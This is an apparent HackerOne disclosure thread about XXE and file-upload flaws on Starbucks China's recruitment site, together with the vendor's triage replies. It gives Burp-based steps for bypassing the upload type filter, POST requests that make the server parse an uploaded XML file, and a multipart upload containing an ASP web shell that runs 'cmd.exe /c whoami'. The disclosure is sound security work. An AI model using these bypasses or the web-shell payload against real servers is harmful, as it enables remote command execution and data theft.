title: XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx

profile.name: Starbucks
profile.about: Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.

vulnerability_information:
**Description:**
Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be  parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. 

## Steps To Reproduce:

Upload and XXE vulnerability: 
1. Log in to the user, enter the personal information settings page, click Upload Image 
2. Intercept https access information through Burp suite
3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html"
4. Get the server's response information,visited the uploaded file URL.
https://ecjobs.starbucks.com.cn/retail/tempfiles/temp_uploaded_641dee35-5a62-478e-90d7-f5558a78c60e.html
5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like

>POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;

or change the "HX_PAGE_NAME" params of xml date by post

>POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"


post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.

## Impact

The vulnerability can  let the attacker upload the evil files in the server which will spoof the user,steal the user's cookie and informations.The XXE  vulnerability disclose some server's informations ,denial of service attack，maybe will cause NTLMv2 hash attacks through XXE(the starbucks'server environment is iis 7.5+asp.net+windows), which could lead to  attackers having full control over the server and the entire inner domain.
By the way,if the report isn't considered eligible.please let me close this report myself.Thank you
vulnerability_information_html:
Description:
Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files.

Steps To Reproduce:

Upload and XXE vulnerability:

  1. Log in to the user, enter the personal information settings page, click Upload Image
  2. Intercept https access information through Burp suite
  3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html"
  4. Get the server's response information,visited the uploaded file URL. https://ecjobs.starbucks.com.cn/retail/tempfiles/temp_uploaded_641dee35-5a62-478e-90d7-f5558a78c60e.html
  5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like

POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;

or change the "HX_PAGE_NAME" params of xml date by post

POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"

post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.

Impact

The vulnerability can let the attacker upload the evil files in the server which will spoof the user,steal the user's cookie and informations.The XXE vulnerability disclose some server's informations ,denial of service attack，maybe will cause NTLMv2 hash attacks through XXE(the starbucks'server environment is iis 7.5+asp.net+windows), which could lead to attackers having full control over the server and the entire inner domain.
By the way,if the report isn't considered eligible.please let me close this report myself.Thank you

activities.message:
hi guys.I have been paying attention to the reported vulnerability points these days. I found that the reported XXE vulnerability has been fixed, but I found that in the avatar upload page, you can bypass the upload file limit by adding a space after the file type. I can upload asp. /aspx and other dynamic files.It's more serious than XXE vulerability,attacker can run malicious cmd on the server. Reproduce: 1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint. 2. Use burp suite tools to interupt the avatar upload request. 3. Replace the post informations with belowed . ``` -----------------------------41184676334 Content-Disposition: form-data; name="txtUploadFile"; filename="i_can_upload_aspfile_by_space.asp " Content-Type: image/png

POC by hackerone_john stone

``` Looking forward. With kind regards John stone
activities.markdown_message:
hi guys.I have been paying attention to the reported vulnerability points these days. I found that the reported XXE vulnerability has been fixed, but I found that in the avatar upload page, you can bypass the upload file limit by adding a space after the file type. I can upload asp. /aspx and other dynamic files.It's more serious than XXE vulerability,attacker can run malicious cmd on the server.
Reproduce:

  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the post informations with belowed .
-----------------------------41184676334
Content-Disposition: form-data; name="txtUploadFile"; filename="i_can_upload_aspfile_by_space.asp "
Content-Type: image/png

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
</textarea>
</body>
</html>

Looking forward.
With kind regards
John stone

activities.message:
Hi @johnstone 

Thank you for bringing this new issue to our attention. Please submit a separate report so that we can triage and respond accordingly. 

This site is not one listed in our In scope assets within our policy so it is not eligible for a bounty at the moment. However, once resolved, you will still benefit from the points here on HackerOne.

activities.message:
Hi @johnstone,

I think we may have had a miscommunication with the team in China here, and I don't believe we ever got clarification from you or them that the XXE issue is actually resolved. Can you please confirm whether you're still able to reproduce the XXE? I'm going to continue to investigate on our end to see if I can repro the bug as well.

Thanks!
@shadegrown

activities.message:
Hi @shadegrown ,I was try to repro the XXE vulnerability on the endpoint these days,Although i guess the XXE vulnerability isn't fix clean,but i don't really find some valid information to repro the vulnerability.here is my progress of repro.
When you want to find XXE vulnerability,I think two important points is necessary.
1.Users can add/modify the xml data and post it to the server.
2.The server can identify xml format and parse dtd.
So i try to test the endpoint frist.
``/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;jpeg;png;bmp;``
I found some potential risk on upload functionaly via delete the ``allow_file_type_list parameter``like xml/doct/xls/cgi etc,which i have been Mentioned in #506646 reports.
{F462221}
Then i replace the ``_hxpage`` parameter value to ``temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml `` that i uploaded,the server response the error information.
{F462222}
replace the ``_hxpage`` like doc/xls file etc,the server response the same error information,i guess the server did't determine whether it is valid according to the ``_hxpage`` parameter content of the file.It seems to just determine the file name value whether it is valid.
Second test way is replace the UUID to the ``hx_page_param_uuid``
{F462220}
when user uploaded the file,the server will modify the file name like ``temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml ``  replace the ``c540d606-dceb-4254-a800-45b58af5164c`` to the ``hx_page_param_uuid`` parameter value,the server response the error information too.
Maybe I lost some  key steps for repro. Looking forward to your suggestions.
Best reguards!
Thank you~
@johnstone
activities.markdown_message:
Hi @shadegrown ,I was try to repro the XXE vulnerability on the endpoint these days,Although i guess the XXE vulnerability isn't fix clean,but i don't really find some valid information to repro the vulnerability.here is my progress of repro.
When you want to find XXE vulnerability,I think two important points is necessary.
1.Users can add/modify the xml data and post it to the server.
2.The server can identify xml format and parse dtd.
So i try to test the endpoint frist.
/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;jpeg;png;bmp;
I found some potential risk on upload functionaly via delete the allow_file_type_list parameterlike xml/doct/xls/cgi etc,which i have been Mentioned in #506646 reports.

Then i replace the _hxpage parameter value to temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml that i uploaded,the server response the error information.

replace the _hxpage like doc/xls file etc,the server response the same error information,i guess the server did't determine whether it is valid according to the _hxpage parameter content of the file.It seems to just determine the file name value whether it is valid.
Second test way is replace the UUID to the hx_page_param_uuid

when user uploaded the file,the server will modify the file name like temp_uploaded_c540d606-dceb-4254-a800-45b58af5164c.xml replace the c540d606-dceb-4254-a800-45b58af5164c to the hx_page_param_uuid parameter value,the server response the error information too.
Maybe I lost some key steps for repro. Looking forward to your suggestions.
Best reguards!
Thank you~
@johnstone

activities.message:
Hi @johnstone,

Thank you for taking the extra time to confirm that the XXE vulnerability has been resolved! I also confirmed that I was no longer able to reproduce the issue.

Similarly to your related file upload RCE, we feel that this finding has also demonstrated significant information disclosure and is eligible for a bounty even though the domain is not included in the program scope.

Thank you again for the report. We hope to see more submissions from you in the future!

Thanks,
@shadegrown
activities.markdown_message:
Hi @johnstone,

Thank you for taking the extra time to confirm that the XXE vulnerability has been resolved! I also confirmed that I was no longer able to reproduce the issue.

Similarly to your related file upload RCE, we feel that this finding has also demonstrated significant information disclosure and is eligible for a bounty even though the domain is not included in the program scope.

Thank you again for the report. We hope to see more submissions from you in the future!

Thanks,
@shadegrown

Thank you @shadegrown ：）
Best regards
@johnstone

summaries.content:
johnstone discovered that both ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx & ecjobs.starbucks.com.cn/recruitjob/hxpublic_v6/hxdynamicpage6.aspx page and were vulnerable to an XML External Entities (XXE) attack.
@johnstone — thank you for reporting this vulnerability and your additional efforts to confirm the resolution.
summaries.content_html:
johnstone discovered that both ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx & ecjobs.starbucks.com.cn/recruitjob/hxpublic_v6/hxdynamicpage6.aspx page and were vulnerable to an XML External Entities (XXE) attack.
@johnstone — thank you for reporting this vulnerability and your additional efforts to confirm the resolution.
